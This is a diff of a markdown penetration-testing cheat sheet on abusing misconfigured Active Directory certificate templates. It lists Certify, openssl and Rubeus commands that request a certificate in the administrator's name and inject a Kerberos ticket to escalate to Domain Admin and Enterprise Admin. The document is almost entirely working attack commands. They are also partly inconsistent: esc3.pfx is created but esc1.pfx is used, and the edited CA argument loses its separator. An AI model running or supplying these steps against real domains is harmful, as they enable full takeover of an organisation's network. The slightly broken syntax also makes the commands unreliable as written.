@@ -12,17 +12,14 @@ Enrolee can request cert for ANY user
 
 ### **Escalation to DA**
 
-*  `Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name> /altname:administrator` <sub>**(DA)**</sub>
-* **Convert from cert.pem to pfx and use it to request a TGT for DA (or EA).**
+*  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:administrator`&#x20;
+* **Convert from cert.pem to pfx and use it to request a TGT for DA.**
   * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
-
-
-
-* `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt` <sub>**(DA)**</sub>
+* `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt`&#x20;
 
 ### Escalation to EA
 
-*  `Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name> /altname:<parent-domain>\administrator`&#x20;
-* **Convert from cert.pem to pfx and use it to request a TGT for DA (or EA).**
+*  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:<parent-domain>\administrator`&#x20;
+* **Convert from cert.pem to pfx and use it to request a TGT for EA.**
   * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
 * `Rubeus.exe asktgt /user:<parent-domain>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /password:SecretPass@123 /ptt` &#x20;
